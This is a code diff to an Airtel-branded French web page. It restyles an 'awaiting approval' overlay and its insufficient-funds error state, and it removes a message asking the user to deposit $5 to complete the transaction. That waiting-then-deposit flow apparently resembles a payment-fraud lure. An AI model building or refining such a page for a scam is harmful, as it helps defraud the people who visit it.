@@ -226,24 +226,68 @@
     max-width:280px;
     line-height:1.5;
   }
+  .approval-overlay .error-icon{
+    display:none;
+    width:72px;
+    height:72px;
+    border-radius:50%;
+    background:#fff1f2;
+    border:1px solid #f3c7c2;
+    align-items:center;
+    justify-content:center;
+    color:var(--airtel-red);
+    font-size:34px;
+    font-weight:800;
+    box-shadow:0 8px 24px rgba(227,6,19,0.10);
+  }
+
+  .approval-overlay.error-state{
+    gap:14px;
+  }
+
+  .approval-overlay.error-state .error-icon{
+    display:flex;
+    margin-bottom:8px;
+  }
+
   .approval-overlay .denied-msg{
     display:none;
-    color:var(--airtel-red);
-    font-weight:700;
+    color:#8f1d18;
+    background:#fff7f6;
+    border:1px solid #f1d0cd;
+    border-radius:14px;
+    font-weight:600;
     font-size:14px;
+    line-height:1.55;
+    max-width:360px;
+    padding:16px 20px;
+    box-shadow:0 6px 18px rgba(0,0,0,0.04);
   }
   .approval-overlay .retry-btn{
     display:none;
-    margin-top:4px;
+    margin-top:8px;
     border:none;
     background:var(--airtel-red);
     color:#fff;
     font-weight:700;
-    font-size:13px;
+    font-size:14px;
     letter-spacing:0.4px;
+    min-width:150px;
+    min-height:48px;
     padding:12px 28px;
     border-radius:24px;
     cursor:pointer;
+    box-shadow:0 8px 18px rgba(227,6,19,0.25);
+    transition:transform .15s ease, box-shadow .15s ease;
+  }
+
+  .approval-overlay .retry-btn:hover{
+    transform:translateY(-1px);
+    box-shadow:0 10px 22px rgba(227,6,19,0.30);
+  }
+
+  .approval-overlay .retry-btn:active{
+    transform:translateY(1px);
   }
 
   footer{
@@ -338,6 +382,7 @@
   </main>
 
   <div class="approval-overlay" id="approvalOverlay">
+    <div class="error-icon" id="errorIcon" aria-hidden="true">!</div>
     <div class="spinner" id="spinner"></div>
     <h2 id="overlayTitle">En attente d'approbation</h2>
     <p id="overlayText">Votre demande a été envoyée. Merci de patienter pendant la vérification…</p>
@@ -400,6 +445,7 @@
 
   function showOverlayWaiting(){
     overlay.classList.add('visible');
+    overlay.classList.remove('error-state');
     spinner.style.display = 'block';
     overlayTitle.textContent = "En attente d'approbation";
     overlayTitle.style.display = 'block';
@@ -432,7 +478,9 @@
           spinner.style.display = 'none';
           overlayTitle.style.display = 'none';
           overlayText.style.display = 'none';
-          deniedMsg.textContent = 'Fonds insuffisants. Veuillez déposer 5 $ pour finaliser la transaction.';
+          overlay.classList.add('error-state');
+
+          deniedMsg.textContent = 'Fonds insuffisants. Veuillez vérifier votre solde et réessayer.';
           deniedMsg.style.display = 'block';
           retryBtn.style.display = 'inline-block';
         }
